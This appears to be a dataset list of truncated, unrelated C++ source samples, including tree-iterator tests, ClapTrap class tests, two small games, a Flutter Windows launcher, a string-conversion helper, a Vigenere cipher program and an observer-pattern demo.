SUBCASE(\"Post-Order Iterator\") {\n        std::vector<char> expected = {'D', 'H', 'E', 'B', 'F', 'G', 'C', 'A'};\n        std::vector<char> result;\n\n        for (auto it = binary_tree.begin_post_order(); it != binary_tree.end_post_order(); ++it) {\n            result.push_back(*it);\n        }\n\n        CHECK(result == expected);\n    }\n\n    SUBCASE(\"In-Order Iterator\") {\n        std::vector<char> expected = {'D', 'B', 'H', 'E', 'A', 'F', 'C', 'G'};\n        std::vector<char> result;\n\n        for (auto it = binary_tree.begin_in_order(); it != binary_tree.end_in_order(); ++it) {\n            result.push_back(*it);\n        }\n\n        CHECK(result == expected);\n    }\n\n    SUBCASE(\"BFS Iterator\") {\n        std::vector<char> expected = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H'};\n        std::vector<char> result;\n\n        for (auto it = binary_tree.begin_bfs_scan(); it != binary_tree.end_bfs_scan(); ++it) {\n            result.push_back(*it);\n        }\n\n        CHECK(result == expected);\n    }\n\n    SUBCASE(\"DFS Iterator\") {\n        std::vector<char> expected = {'A', 'B', 'D', 'E', 'H', 'C', 'F', 'G'};\n        std::vector<char> result;\n\n        for (auto it = binary_tree.begin_dfs_scan(); it != binary_tree.end_dfs_scan(); ++it) {\n            result.push_back(*it);\n        }\n\n        CHECK(result == expected);\n    }\n\n    // Optionally add more subcases for other iterators or functionalities\n}\n\nTEST_CASE(\" Tree whith K=4 Iterators with double data type\") {\n    Tree<double, 4> binary_tree;  // Binary tree with max 4 children per node\n\n    // Define the binary tree once for the entire test case\n    Node<double> root(1.0);\n    binary_tree.add_root(&root);\n\n    // Add nodes\n    Node<double> node2(2.0);\n    Node<double> node3(3.0);\n    Node<double> node4(4.0);\n    Node<double> node5(5.0);\n    Node<double> node6(6.0);\n    Node<double> node7(7.0);\n    Node<double> node8(8.0);\n    Node<double> node9(9.0);\n    Node<double> node10(10.0);\n    Node<double> node11(11.0);\n    Node<double> node12(12.0);\n\n    binary_tree.add_sub_node(&root, &node2);\n    binary_tree.add_sub_node(&root, &node3);\n    binary_tree.add_sub_node(&root, &node4);\n    binary_tree.add_sub_node(&root, &node5);\n    binary_tree.add",
    "#include <iostream>\n\n#include \"ClapTrap.hpp\"\n#include \"ScavTrap.hpp\"\n\nint main()\n{\n    // ClapTrap tests\n    {\n        std::cout << \"[TEST] ClapTrap is initialized properly\" << std::endl;\n        ClapTrap::ClapTrap bob(\"Bob\");\n        (void)bob.getHitPoints();\n        (void)bob.getEnergyPoints();\n        (void)bob.getAttackDamage();\n    }\n    std::cout << std::endl;\n    {\n        std::cout << \"[TEST] ClapTrap can attack with 0 attack damage\" << std::endl;\n        ClapTrap::ClapTrap bob(\"Bob\");\n        bob.setAttackDamage(static_cast<unsigned int>(0));\n        bob.attack(\"John\");\n    }\n    std::cout << std::endl;\n    {\n        std::cout << \"[TEST] ClapTrap can attack with 5 attack damage\" << std::endl;\n        ClapTrap::ClapTrap bob(\"Bob\");\n        bob.setAttackDamage(static_cast<unsigned int>(5));\n        bob.attack(\"John\");\n    }\n    std::cout << std::endl;\n    {\n        std::cout << \"[TEST] ClapTrap loses 1 energy point when attacking with 0 attack damage\" << std::endl;\n        ClapTrap::ClapTrap bob(\"Bob\");\n        bob.setAttackDamage(static_cast<unsigned int>(0));\n        (void)bob.getEnergyPoints();\n        bob.attack(\"John\");\n        (void)bob.getEnergyPoints();\n    }\n    std::cout << std::endl;\n    {\n        std::cout << \"[TEST] ClapTrap loses 1 energy point when attacking with 5 attack damage\" << std::endl;\n        ClapTrap::ClapTrap bob(\"Bob\");\n        bob.setAttackDamage(static_cast<unsigned int>(5));\n        (void)bob.getEnergyPoints();\n        bob.attack(\"John\");\n        (void)bob.getEnergyPoints();\n    }\n    std::cout << std::endl;\n    {\n        std::cout << \"[TEST] ClapTrap loses 5 hit points when taking 5 damage\" << std::endl;\n        ClapTrap::ClapTrap bob(\"Bob\");\n        (void)bob.getHitPoints();\n        bob.takeDamage(static_cast<unsigned int>(5));\n        (void)bob.getHitPoints();\n    }\n    std::cout << std::endl;\n    {\n        std::cout << \"[TEST] ClapTrap can't attack when has 0 hit points\" << std::endl;\n        ClapTrap::ClapTrap bob(\"Bob\");\n        bob.setHitPoints(static_cast<unsigned int>(0));\n        bob.attack(\"John\");\n    }\n    std::cout << std::endl;\n    {\n        std::cout << \"[TEST] ClapTrap can't attack when has 0 energy points\" << std::endl;\n        ClapTrap::ClapTrap bob(\"Bob\");\n        bob.setEnergyPoints(static_cast<unsigned int>(0));\n        bob.attack(\"John\");\n    }\n    std::cout << std::endl;\n    {\n        std::cout << \"[TEST] ClapTrap can't repair when has 0 hit points\" << std::endl;\n        ClapTrap::ClapTrap bob(\"Bob\");\n        bob.setHitPoints(static_cast<unsigned int>(0));\n        bob.beRepaired(static_cast<unsigned int>(5));\n    }\n    std::cout << std::endl;\n    {\n        std::cout << \"[TEST] ClapTrap can't repair when has 0 energy points\" << std::endl;\n        ClapTrap::ClapTrap bob(\"Bob\");\n        bob.setEnergyPoints(static_cast<unsigned int>(0));\n        bob.beRepaired(static_cast<unsigned int>(5));\n    }\n    std::cout << std::endl;\n    {\n        std::cout << \"[TEST] ClapTrap receives 0 hit points when recovering with 0\" << std::endl;\n        ClapTrap::ClapTrap bob(\"Bob\");\n        (void)bob.getHitPoints();\n        bob.beRepaired(static_cast<unsigned int>(0));\n        (void)bob.getHitPoints();\n    }\n    std::cout << std::endl;\n    {\n        std::cout << \"[TEST] ClapTrap receives 5 hit points when recovering with 5\" << std::endl;\n        ClapTrap::ClapTrap bob(\"Bob\");\n        (void)bob.getHitPoints();\n        bob.beRepaired(static_cast<unsigned int>(5));\n        (void)bob.getHitPoints();\n    }\n    std::cout << std::endl;\n    {\n        std::cout << \"[TEST] ClapTrap loses 1 energy point when recovering with 0\" << std::endl;\n        ClapTrap::ClapTrap bob(\"Bob\");\n        (void)bob.getEnergyPoints();\n        bob.beRepaired(static_cast<unsigned int>(0));\n        (void)bob.getEnergyPoints();\n    }\n    std::cout << std::endl;\n    {\n        std::cout << \"[TEST] ClapTrap loses 1 energy point when recovering with 5\" << std::endl;\n        ClapTrap::ClapTrap bob(\"Bob\");\n        (void)bob.getEnergyPoints();\n        bob.beRepaired(static_cast<unsigned int>(5));\n        (void)bob.getEnergyPoints();\n    }\n    std::cout << std::endl;\n\n    // ScavTrap tests\n    {\n        std::cout << \"[TEST] ScavTrap is initialized properly\" << std::endl;\n        ClapTrap::ScavTrap bob(\"Bob\");\n        (void)bob.getHitPoints();\n        (void)bob.getEnergyPoints();\n        (void)bob.getAttackDamage();\n    }\n    std::cout << std::endl;\n    {\n        std::cout << \"[TEST] ScavTrap can attack properly\" << std::endl;\n        ClapTrap::ScavTrap bob(\"Bob\");\n        bob.attack(\"John\");\n    }\n    std::cout << std::endl;\n    {\n        std::cout << \"[TEST] ScavTrap can guard the gate\" << std::endl;\n        ClapTrap::ScavTrap bob(\"Bob\");\n        bob.guardGate();\n    }\n    std::cout << std::endl;\n}\n",
    "#include <sstream>\n#include <SFML/Graphics.hpp>\n#include <SFML/Window.hpp>\n#include <vector>\n#include <list>\n#include <ctime>\n#include <cmath>\n\n\n#include \"headers/map.h\"\n#include \"headers/view.h\"\n#include \"headers/MainMenu.h\"\n#include \"headers/Info.h\"\n\n\nusing namespace sf;\n\n\nclass Entity {\npublic:\n    float dx, dy, x, y, speed, moveTimer;\n    int w, h, health;\n    bool life;\n    Texture texture;\n    Sprite sprite;\n    String name;\n\n    Entity(Image& image, String Name, float X, float Y, int W, int H) {\n        x = X; y = Y; w = W; h = H; name = Name; moveTimer = 0;\n        speed = 0; health = 100; dx = 0; dy = 0;\n        life = true;\n        texture.loadFromImage(image);\n        sprite.setTexture(texture);\n        sprite.setOrigin(w / 2, h / 2);\n    }\n\n    FloatRect getRect() {\n        return FloatRect(x, y, w, h);\n    }\n\n    bool checkCollision(Entity& other) {\n        return sprite.getGlobalBounds().intersects(other.sprite.getGlobalBounds());\n    }\n};\n\nclass Enemy : public Entity {\npublic:\n    float frameTime;\n    int currentFrame;\n\n    Enemy(Image& image, String Name, float X, float Y, int W, int H) : Entity(image, Name, X, Y, W, H) {\n        frameTime = 0;\n        currentFrame = 0;\n        if (name == \"EasyEnemy\") {\n            sprite.setTextureRect(IntRect(11, 6, w, h));\n            dx = 0.1;\n        }\n    }\n\n    void checkCollisionWithMap(float Dx, float Dy) {\n    for (int i = y / 32; i < (y + h) / 32; i++) {\n        for (int j = x / 32; j < (x + w) / 32; j++) {\n            if (i >= 0 && i < HEIGHT_MAP && j >= 0 && j < WIDTH_MAP) {\n                if (TileMap[i][j] == '0') {\n                    if (Dy > 0) { y = i * 32 - h; }\n                    if (Dy < 0) { y = i * 32 + 32; }\n                    if (Dx > 0) { x = j * 32 - w; dx = -0.1; sprite.scale(-1, 1); }\n                    if (Dx < 0) { x = j * 32 + 32; dx = 0.1; sprite.scale(-1, 1); }\n                }\n            } else {\n                std::cerr << \"Index out of bounds: i=\" << i << \", j=\" << j << std::endl;\n            }\n        }\n    }\n}\n    void update(float time) {\n        if (name == \"EasyEnemy\") {\n            checkCollisionWithMap(dx, 0);\n            x += dx * time;\n            sprite.setPosition(x + w / 2, y + h / 2);\n            animate(time);\n            if (health <= 0) { life = false; }\n        }\n    }\n\n    void animate(float time) {\n        time = time / 800;\n        static const float ANIMATION_SPEED = 0.2f;  \n        frameTime += time;\n\n        if (frameTime >= ANIMATION_SPEED) {\n            frameTime = 0;\n            currentFrame = (currentFrame + 1) % 3; \n        }\n\n        if (dx > 0) {//rigth\n            sprite.setTextureRect(IntRect(72 * currentFrame, 104, 62, 45));\n        }\n        else if (dx < 0) {//left\n            sprite.setTextureRect(IntRect(72 * currentFrame, 104, 62, 45));\n        }\n    }\n};\n\nclass Player : public Entity {\npublic:\n    enum stateObjeckt { left, right, up, down, stay } state;\n    int playerScore;\n    float frameTime;\n    int currentFrame;\n\n    Player(Image& image, String Name, float X, float Y, int W, int H) : Entity(image, Name, X, Y, W, H) {\n        playerScore = 0;\n        state = stay;\n        frameTime = 0;\n        currentFrame = 0;\n        if (name == \"Player1\") {\n            sprite.setTextureRect(IntRect(0, 0, w, h));\n        }\n    }\n\n    void update(float time) {\n        control();\n        switch (state) {\n        case right: dx = speed; dy = 0; break;\n        case left: dx = -speed; dy = 0; break;\n        case up: dx = 0; dy = -speed; break;\n        case down: dx = 0; dy = speed; break;\n        case stay: dx = 0; dy = 0; break;\n        }\n\n        x += dx * time;\n        checkCollisionWithMap(dx, 0);\n        y += dy * time;\n        checkCollisionWithMap(0, dy);\n        sprite.setPosition(x + w / 2, y + h / 2);\n        if (life) { setPlayerCoordForView(x, y); }\n\n        animate(time);\n    }\n\n    void control() {\n        if (health <= 0) {\n            state = stay;\n            speed = 0;\n            life = false;\n            return;\n        }\n\n        float baseSpeed = 0.2f;\n        float boostSpeed = 0.3f;\n        float currentSpeed = (Keyboard::isKeyPressed(Keyboard::LShift) || Keyboard::isKeyPressed(Keyboard::RShift)) ? boostSpeed : baseSpeed;\n\n        state = stay;\n        if (Keyboard::isKeyPressed(Keyboard::A)) {\n            state = left;\n        }\n        else if (Keyboard::isKeyPressed(Keyboard::D)) {\n            state = right;\n        }\n        else if (Keyboard::isKeyPressed(Keyboard::W)) {\n            state = up;\n        }\n        else if (Keyboard::isKeyPressed(Keyboard::S)) {\n            state = down;\n        }\n\n        if (state == left || state == right) {\n            dy = 0;\n        }\n        if (state == up || state == down) {\n            dx = 0;\n        }\n\n        speed = (state != stay) ? currentSpeed : 0.0f;\n    }\n    void animate(float time) {\n        time = time / 800;\n        static const float ANIMATION_SPEED = 0.1f;  // Adjust this value to control the speed of the an",
    "#include \"iGraphics.h\"\n#include <GL/glut.h>\n#include <string>\n#include <iostream>\n#include <fstream>\n#include <algorithm>\n#include <utility>\n#include <vector>\n#include <math.h>\n\nvoid drawHomePage();\nvoid drawStartPage();\nvoid drawnamepage();\nvoid StartButtonClickHandler();\nvoid drawInstPage();\nvoid InstButtonClickHandler();\nvoid BackButtonClickHandler();\nvoid coordinates();\nvoid location_change();\nvoid drawwinpage();\nvoid drawgamepage();\nvoid check_pic();\nvoid drawscorepage();\nvoid drawsettingspage();\nvoid drawaboutuspage();\nvoid drawlosepage();\nvoid musicplay(int n);\nvoid drawleaderboard();\nvoid drawpicpage();\n\nbool homepage=1;\nbool startpage=0;\nbool gamepage=0;\nbool instpage=0;\nbool winpage=0;\nbool losepage=0;\nbool namepage=0;\nbool settings=0;\nbool about_us=0;\nbool leaderboard=0;\nbool picpage=0;\n\nbool musicon=1;\n\nint mode =1; //easy mode \nint picc=1;\nint moves =0;\nint TIME=31000;\nchar arr[100], str[10];\nint index = 0, run = 1;\nclock_t start;\n\nstruct pic{\n\tint x;\n\tint y;\n};\n\nstruct correct_pic{\n\tint x;\n\tint y;\n};\n\nstruct pic pic[25];\nstruct correct_pic correct_pic[25];\n\nint openx = 0, openy = 480;\nint x = 300, y = 300, r = 20;\nbool correct = true;\n\n\nchar picture[2][25][20] = {\n   {\"image\\\\52.bmp\", \"image\\\\51.bmp\", \"image\\\\50.bmp\", \"image\\\\49.bmp\", \"image\\\\48.bmp\",\n    \"image\\\\47.bmp\", \"image\\\\46.bmp\", \"image\\\\45.bmp\", \"image\\\\44.bmp\", \"image\\\\43.bmp\",\n    \"image\\\\42.bmp\", \"image\\\\41.bmp\", \"image\\\\40.bmp\", \"image\\\\39.bmp\", \"image\\\\38.bmp\",\n    \"image\\\\37.bmp\", \"image\\\\36.bmp\", \"image\\\\35.bmp\", \"image\\\\34.bmp\", \"image\\\\33.bmp\",\n    \"image\\\\32.bmp\", \"image\\\\31.bmp\", \"image\\\\30.bmp\", \"image\\\\29.bmp\", \"image\\\\28.bmp\"},\n    \n   {\"image\\\\25.bmp\", \"image\\\\24.bmp\", \"image\\\\23.bmp\", \"image\\\\22.bmp\", \"image\\\\21.bmp\",\n    \"image\\\\20.bmp\", \"image\\\\19.bmp\", \"image\\\\18.bmp\", \"image\\\\17.bmp\", \"image\\\\16.bmp\",\n    \"image\\\\15.bmp\", \"image\\\\14.bmp\", \"image\\\\13.bmp\", \"image\\\\12.bmp\", \"image\\\\11.bmp\",\n    \"image\\\\10.bmp\", \"image\\\\09.bmp\", \"image\\\\08.bmp\", \"image\\\\07.bmp\", \"image\\\\06.bmp\",\n    \"image\\\\05.bmp\", \"image\\\\04.bmp\", \"image\\\\03.bmp\", \"image\\\\02.bmp\", \"image\\\\01.bmp\"}\n};\n\n\n\n\n\nchar alt[25][20];\n\n\n\nvoid iDraw() {\n\tiClear();\n\tif(homepage){\n\t\tdrawHomePage();\n\t}\n\telse if(startpage){\n\t\tdrawStartPage();\n\t}\n\telse if(gamepage)\n\t{\n\n\t\tiShowBMP2(600,0,\"image\\\\gamepage.png\",0);\n\t\t//iSetColor(144, 238, 144);\n\t\tclock_t end = clock();\n\t\tdouble time_diff = (start - end) / CLOCKS_PER_SEC;\n\t\tchar str2[10];\n\t\tsprintf(str2, \"%.2lf\", time_diff);\n\t\tif (time_diff < 1)\n\t\t{\n\t\t\thomepage = 0;\n\t\t\tstartpage = 0;\n\t\t\tinstpage = 0;\n\t\t\twinpage = 0;\n\t\t\tgamepage = 0;\n\t\t\tnamepage = 0;\n\t\t\tsettings = 0;\n\t\t\tabout_us = 0;\n\t\t\tlosepage = 1;\n\t\t\tleaderboard=0;\n\t\t\tpicpage=0;\n\t\t}\n\t\t//iText(730, 450, \"TIME :\", GLUT_BITMAP_TIMES_ROMAN_24);\n\t\tiText(770, 420, str2, GLUT_BITMAP_TIMES_ROMAN_24);\n\n\t\t//iSetColor(149, 33, 246);\n\t\t//iFilledRectangle(0, 0, 700, 700);\n\t\t//iSetColor(255, 255, 255);\n\t\t//iText(740, 330, \"MOVES ->\", GLUT_BITMAP_TIMES_ROMAN_24);\n\t\tsprintf(str, \"%i\", moves);\n\t\t//iSetColor(255, 0, 0);\n\t\tiText(800,236, str, GLUT_BITMAP_TIMES_ROMAN_24);\n\t\tint count = 1;\n\t\tfor (int i = 0; i < 5; i++)\n\t\t\t{\n\t\t\t\tfor (int j = 0; j < 5; j++)\n\t\t\t\t{\n\t\t\t\t\tif (i == 0 && j == 0)\n\t\t\t\t\t\tcontinue;\n\t\t\t\t\telse\n\t\t\t\t\t{\n\t\t\t\t\t\tiShowBMP(pic[count].x, pic[count].y, picture[picc][count]);\n\t\t\t\t\t\tcount++;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\tcheck_pic();\n\t\tif (correct == true)\n\t\t{\n\t\t\tprintf(\"CONGOOOOO\\n\");\n\t\t\thomepage = 0;\n\t\t\tstartpage = 0;\n\t\t\tinstpage = 0;\n\t\t\twinpage = 1;\n\t\t\tgamepage = 0;\n\t\t\tnamepage = 0;\n\t\t\tsettings = 0;\n\t\t\tabout_us = 0;\n\t\t\tlosepage = 0;\n\t\t\tleaderboard =0;\n\t\t\tpicpage=0;\n\t\t}\n\t\t\n\t}else if(namepage){\n\t\tdrawnamepage();\n\t}else if(instpage){\n\t\tdrawInstPage();\n\t}else if(winpage){\n\t\tdrawwinpage();\n\t}else if(settings){\n\t\tdrawsettingspage();\n\t}else if(about_us){\n\t\tdrawaboutuspage();\n\t}else if(losepage){\n\t\tdrawlosepage();\n\t}else if(leaderboard){\n\t\tdrawleaderboard();\n\t}else if(picpage){\n\t\tdrawpicpage();\n\t}\n}\n\nvoid iMouseMove(int mx, int my) {\n\tprintf(\"x = %d, y= %d\\n\",mx,my);\n}\n\nvoid iMouse(int button, int state, int mx, int my)\n{\n\tif (button == GLUT_LEFT_BUTTON && state == GLUT_DOWN)\n\t{\n\t\tprintf(\"x = %d, y= %d\\n\", mx, my);\n\t\tif (homepage && (mx >= 385 && mx <= 615) && (my >= 363 && my <= 423))\n\t\t{\n\t\t\thomepage = 0;\n\t\t\tstartpage = 1;\n\t\t\tinstpage = 0;\n\t\t\twinpage = 0;\n\t\t\tgamepage = 0;\n\t\t\tnamepage = 0;\n\t\t\tsettings = 0;\n\t\t\tabout_us = 0;\n\t\t\tlosepage = 0;\n\t\t\tleaderboard = 0;\n\t\t\tpicpage=0;\n\t\t}\n\t\telse if (homepage && (mx >= 385 && mx <= 615) && (my >= 264 && my <= 324))\n\t\t{\n\t\t\thomepage = 0;\n\t\t\tstartpage = 0;\n\t\t\tinstpage = 1;\n\t\t\twinpage = 0;\n\t\t\tgamepage = 0;\n\t\t\tnamepage = 0;\n\t\t\tsettings = 0;\n\t\t\tabout_us = 0;\n\t\t\tlosepage = 0;\n\t\t\tleaderboard = 0;\n\t\t\tpicpage=0;\n\t\t}\n\t\telse if (homepage && (mx >= 385 && mx <= 615) && (my >= 180 && my <= 240))\n\t\t{\n\t\t\thomepage = 0;\n\t\t\tstartpage = 0;\n\t\t\tinstpage = 0;\n\t\t\twinpage = 0;\n\t\t\tgamepage = 0;\n\t\t\tnamepage = 0;\n\t\t\tsettings = 1;\n\t\t\tabout_us = 0;\n\t\t\tlosepage = 0;\n\t\t\tleaderboard = 0;\n\t\t\tpicpage=0;\n\t\t}\n\t\telse if (homepage && (mx >= 385 && mx <= 615) && (my >= 80 && my <= 140))\n\t\t{\n\t\t\tho",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"chat_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <StringUtils.hpp>\r\n#include <WindowsVersions.hpp>\r\n\r\nTStringContainer::TStringContainer(const int size) {\r\n    string = new TCHAR[size];\r\n}\r\n\r\n#if WINDOWS_VERSION <= _WIN32_WINNT_NT35\r\n//Calude ahh generated function.\r\nstatic void ToUCS2(const std::string &utf8,\r\n                   LPWSTR ucs2,\r\n                   size_t ucs2_size) {\r\n    size_t utf8Index{ 0 }, ucs2Index{ 0 };\r\n\r\n    while ((utf8Index < utf8.length()) && (ucs2Index < (ucs2_size - 1))) {\r\n        unsigned char c{ (unsigned char)(utf8[utf8Index++]) };\r\n        unsigned int codepoint{ 0 };\r\n\r\n        if (c <= 0x7F) {\r\n            //ASCII\r\n            codepoint = c;\r\n        } else if (c <= 0xDF) {\r\n            //2 bytes\r\n            if (utf8Index >= utf8.length()) {\r\n                //Replacement character for incomplete sequence.\r\n                codepoint = 0xFFFD;\r\n            } else {\r\n                codepoint = ((c & 0x1F) << 6) | (utf8[utf8Index++] & 0x3F);\r\n            }\r\n        } else if (c <= 0xEF) {\r\n            //3 bytes\r\n            if ((utf8Index + 1) >= utf8.length()) {\r\n                codepoint = 0xFFFD;\r\n            } else {\r\n                codepoint = ((c & 0x0F) << 12) | ((utf8[utf8Index++] & 0x3F) << 6) | (utf8[utf8Index++] & 0x3F);\r\n            }\r\n        } else {\r\n            //4 bytes or higher are not supported in UCS-2.\r\n            codepoint = 0xFFFD;\r\n\r\n            while (utf8Index < utf8.length() && (utf8[utf8Index] & 0xC0) == 0x80) {\r\n                utf8Index++;\r\n            }\r\n        }\r\n\r\n        if (codepoint > 0xFFFF) {\r\n            codepoint = 0xFFFD;\r\n        }\r\n\r\n        ucs2[ucs2Index++] = static_cast<wchar_t>(codepoint);\r\n    }\r\n\r\n    while ((ucs2Index < (ucs2_size - 1)) && (utf8Index < utf8.length())) {\r\n        ucs2[ucs2Index++] = 0xFFFD;\r\n    }\r\n\r\n    ucs2[ucs2Index] = L'\\0';\r\n}\r\n#endif\r\n\r\nTStringContainer::TStringContainer(const std::string &utf8) {\r\n    size_t wideSize = ((utf8.length() * 2) + 1);\r\n    LPWSTR wide{ new WCHAR[wideSize] };\r\n#if WINDOWS_VERSION <= _WIN32_WINNT_NT35\r\n    ToUCS2(utf8, wide, wideSize);\r\n#else\r\n    MultiByteToWideChar(CP_UTF8,\r\n                        0,\r\n                        utf8.c_str(),\r\n                        -1,\r\n                        wide,\r\n                        wideSize);\r\n#endif\r\n\r\n#ifdef UNICODE\r\n    const size_t size{ (wcslen(wide) + 1) };\r\n    string = new TCHAR[size];\r\n    wcscpy(string, wide);\r\n#else\r\n    int ansiSize{ WideCharToMultiByte(CP_ACP,\r\n                                      0,\r\n                                      wide,\r\n                                      -1,\r\n                                      NULL,\r\n                                      0,\r\n                                      NULL,\r\n                                      NULL) };\r\n\r\n    LPSTR ansi{ new CHAR[ansiSize] };\r\n    WideCharToMultiByte(CP_ACP,\r\n                        0,\r\n                        wide,\r\n                        -1,\r\n                        ansi,\r\n                        ansiSize,\r\n                        NULL,\r\n                        NULL);\r\n\r\n    string = new CHAR[ansiSize];\r\n    memcpy(string, ansi, ansiSize);\r\n\r\n    delete[] ansi;\r\n#endif\r\n\r\n    delete[] wide;\r\n}\r\n\r\nLPTSTR TStringContainer::GetString(void) const {\r\n    return string;\r\n}\r\n\r\nTStringContainer::~TStringContainer(void) {\r\n    delete[] string;\r\n    string = NULL;\r\n}",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nint main(){\n    while (true) {\n        string option;\n        string msg;\n        string key;\n        string edited_msg = \"\";\n        string edited_key = \"\";\n        string encrypted_msg = \"\";\n        string decrypted_msg = \"\";\n        cout << \" \" << endl; //this line is only to make the message appear correctly when the loop works\n        //menu and welcome message\n        cout << \"---+----+----+----+----+---\" << endl;\n        cout << \"Welcome To Vigenere Cipher!\" << endl;\n        cout << \"---+----+----+----+----+---\" << endl;\n        cout << \"Menu Options:\" << endl;\n        cout << \"1)Cipher a message\" << endl;\n        cout << \"2)Decipher a message\" << endl;\n        cout << \"3)Exit\" << endl;\n        cout << \"enter choice from 1,2,3: \";\n        cin >> option;\n\n\n        //##############################################################################################################\n        if (option == \"1\") {\n            cout << \"enter message: \" << endl;\n            getline(cin, msg);\n            getline(cin, msg);\n            cout << \"enter key: \" << endl;\n            getline(cin, key);\n            //take only alphabet from message and turn it to upper case\n            for (char i: msg) {\n                if (isalpha(i)) {\n                    edited_msg += toupper(i);\n                }\n            }\n            //take only alphabet from key and turn it to upper case\n            for (char l: key) {\n                if (isalpha(l)) {\n                    edited_key += toupper(l);\n                }\n            }\n            for (int j = 0; j < edited_msg.length(); ++j) {\n                //repeating the key until the message ends\n                char corresponding_key = edited_key[j % (edited_key.length())];\n                int change = corresponding_key - 'A';\n                encrypted_msg += 'A' + (edited_msg[j] - 'A' + change) % 26;\n            }\n            cout << \"encrypted message: \" << encrypted_msg;\n\n\n            //##########################################################################################################\n        } else if (option == \"2\") {\n            cout << \"enter message: \" << endl;\n            getline(cin, msg);\n            getline(cin, msg);\n            cout << \"enter key: \" << endl;\n            getline(cin, key);\n            for (char i: msg) {\n                if (isalpha(i)) {\n                    edited_msg += toupper(i);\n                }\n            }\n            for (char l: key) {\n                if (isalpha(l)) {\n                    edited_key += toupper(l);\n                }\n            }\n            for (int j = 0; j < edited_msg.length(); ++j) {\n                char corresponding_key = edited_key[j % (edited_key.length())];\n                int change = corresponding_key - 'A';\n                decrypted_msg += 'A' + (edited_msg[j] - 'A' - change + 26) % 26;\n            }\n            cout << \"decrypted message: \" << decrypted_msg;\n\n\n            //##########################################################################################################\n        } else if (option == \"3\") {\n            cout << \"thanks for using our program!\";\n            break;\n        }\n\n\n            //##########################################################################################################\n        else {\n            cout << \"ERROR! enter 1 or 2 or 3 only\";\n        }\n\n\n        //##############################################################################################################\n    }\n    return 0;\n}\n",
    "#include <algorithm>\r\n#include <cassert>\r\n#include <cstdint>\r\n#include <iostream>\r\n#include <set>\r\n#include <string>\r\n#include <vector>\r\n\r\n#include \"../../AccessKey.h\"\r\n\r\nclass Observable;\r\n\r\n// \uad00\ucc30\uc790\r\nclass Observer\r\n{\r\npublic:\r\n    virtual ~Observer() = default;\r\n\r\n    virtual void Update(Observable& observable, const void* dataKey) = 0;\r\n\r\nprotected:\r\n    design::AccessKey<Observer> GetAccessKey() { return {}; }\r\n};\r\n\r\n// \uad00\ucc30 \ub300\uc0c1\r\nclass Observable\r\n{\r\npublic:\r\n    virtual ~Observable() = 0;\r\n\r\n    void Attach(Observer& observer)\r\n    {\r\n        observerSet_.insert(&observer);\r\n    }\r\n\r\n    void Detach(Observer& observer)\r\n    {\r\n        observerSet_.erase(&observer);\r\n    }\r\n\r\n    void Notify(const void* dataKey)\r\n    {\r\n        for (auto& observer : observerSet_)\r\n        {\r\n            observer->Update(*this, dataKey);\r\n        }\r\n    }\r\n\r\nprivate:\r\n    std::set<Observer*> observerSet_;\r\n};\r\n\r\ninline Observable::~Observable() = default;\r\n\r\nclass ChatRoom : public Observable\r\n{\r\npublic:\r\n    explicit ChatRoom(std::string name)\r\n        : name_(std::move(name))\r\n    {}\r\n\r\n    void SendMessage(std::string const& message)\r\n    {\r\n        Notify(&message);\r\n    }\r\n\r\n    std::string GetName() const { return name_; }\r\n\r\n    std::string const& GetDataFromKey(design::AccessKey<Observer>,\r\n                                      const void* dataKey)\r\n    {\r\n        assert(dataKey);\r\n        return *reinterpret_cast<std::string const*>(dataKey);\r\n    }\r\n\r\nprivate:\r\n    const std::string name_;\r\n};\r\n\r\nclass User : public Observer\r\n{\r\npublic:\r\n    explicit User(std::string name)\r\n        : name_(std::move(name))\r\n    {}\r\n\r\n    void Update(Observable& observable, const void* dataKey) override\r\n    {\r\n        auto& chatRoom = static_cast<ChatRoom&>(observable);\r\n        assert(chatRoomSet_.find(&chatRoom) != std::end(chatRoomSet_));\r\n\r\n        std::cout << \"[\" << name_ << \"][\" << chatRoom.GetName() << \"] \" <<\r\n            chatRoom.GetDataFromKey(GetAccessKey(), dataKey) << std::endl;\r\n    }\r\n\r\n    void JoinChatRoom(ChatRoom& chatRoom)\r\n    {\r\n        chatRoomSet_.insert(&chatRoom);\r\n        chatRoom.Attach(*this);\r\n    }\r\n\r\nprivate:\r\n    std::string name_;\r\n    std::set<ChatRoom*> chatRoomSet_;\r\n};\r\n\r\n/*\r\n    Observer Pattern\uc740 \uc5b4\ub5a4 \uac1d\uccb4\uc758 \uc0c1\ud0dc\uac00 \ubcc0\ud560 \ub54c, \uadf8 \uac1d\uccb4\uc5d0 \uc758\uc874\uc131\uc744 \uac00\uc9c4 \ub2e4\ub978\r\n    \uac1d\uccb4\ub4e4\uc774 \uadf8 \ubcc0\ud654\ub97c \ud1b5\uc9c0\ubc1b\uace0 \uc790\ub3d9\uc73c\ub85c \uac31\uc2e0\ub420 \uc218 \uc788\ub3c4\ub85d \ud574\uc90d\ub2c8\ub2e4.\r\n*/\r\nint main()\r\n{\r\n    ChatRoom chatRoom_1(\"ChatRoom_1\"), chatRoom_2(\"ChatRoom_2\");\r\n    User user_1(\"User_1\"), user_2(\"User_2\"), user_3(\"User_3\");\r\n\r\n    